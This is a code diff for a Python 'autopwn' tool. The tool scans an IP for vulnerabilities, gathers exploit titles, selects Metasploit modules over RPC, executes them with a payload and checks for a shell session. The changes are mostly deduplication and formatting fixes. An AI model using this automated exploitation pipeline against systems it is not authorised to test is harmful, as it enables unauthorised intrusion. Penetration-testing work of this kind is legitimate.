@@ -142,10 +142,10 @@ def createExploitList(res=[]) -> tuple[list[str], list[str]]:
         exploits += search["RESULTS_EXPLOIT"]
     LOG("Imported exploit_list", logfile, "log")
     if exploits:
-        titles = [pwn["Title"] for pwn in exploits]
         noDuplicattes = []
-        [noDuplicattes.append(i) for i in titles if not noDuplicattes.count(i)]
-        titles = noDuplicattes
+        [noDuplicattes.append(i) for i in exploits if not noDuplicattes.count(i)]
+        exploits = noDuplicattes
+        titles = [pwn["Title"] for pwn in exploits]
         titles = [[k, title] for k, title in enumerate(titles)]
     else:
         LOG("Error 2 : Parsing error.", logfile, "err")
@@ -156,7 +156,7 @@ def createExploitList(res=[]) -> tuple[list[str], list[str]]:
     for j in range(len(titles)):
         if "(Metasploit)" in titles[j][1]:
             metaexploits.append(titles[j])
-    return (titles, metaexploits)
+    return (exploits, titles, metaexploits)
 
 
 def selectExploit(choice=0, titles=[]) -> str:
@@ -193,7 +193,7 @@ def searchModules(client: MsfRpcClient, attack: str) -> list[dict]:
     LOG("Looking for best modules...", logfile, "log")
     attack_cpy = attack
     modules = []
-    while (len(attack_cpy) > 10 and modules == []) :
+    while len(attack_cpy) > 10 and modules == []:
         modules = client.modules.search(attack_cpy)
         attack_cpy = attack_cpy[:-3]
     print("[~] Available modules :")
@@ -284,15 +284,14 @@ def exploitVuln(
             exploit[i] = input(i + ": ")
     LOG("Payload and exploit options set", logfile, "log")
     print(exploit.execute(payload=payload))
-    #cid = client.consoles.console().cid
-    #client.consoles.console(cid).run_module_with_output(exploit, payload=payload)
+    # cid = client.consoles.console().cid
+    # client.consoles.console(cid).run_module_with_output(exploit, payload=payload)
     while len(client.jobs.list) != 0:
         pass
-    if (client.sessions.list == {}) : 
+    if client.sessions.list == {}:
         LOG("Error 9 : Exploit could not be executed", logfile, "err")
         print("[X] Error 9 : Exploit could not be executed")
         exit(-9)
-    
 
 
 def getShell(client=None, id="1"):
@@ -346,7 +345,7 @@ def autopwn(
 
     results = scanIp4Vulnerabilities(EXPLOIT_LIST, IP)
     LOG("Vulnerabilities scanned", logfile, "log")
-    (exploits, metaexploits) = createExploitList(results)
+    (_, exploits, metaexploits) = createExploitList(results)
     client = runMetasploit(False)
 
     if generic_exploit and get_edb_exploits:
@@ -362,7 +361,6 @@ def autopwn(
             LOG("Error 3 : No exploits found on EDB.", logfile, "err")
             print("[X] Error 3 : No exploits found on EDB.")
             exit(-3)
-        
 
         if metaexploits:
             print("[~] Metasploit exploits :")
@@ -372,7 +370,7 @@ def autopwn(
         else:
             LOG("INFO : No exploit found on Metasploit.", logfile, "inf")
             print("[i] INFO : No exploit found on Metasploit.")
-        
+
     else:
         if metaexploits:
             print("[~] Metasploit exploits :")
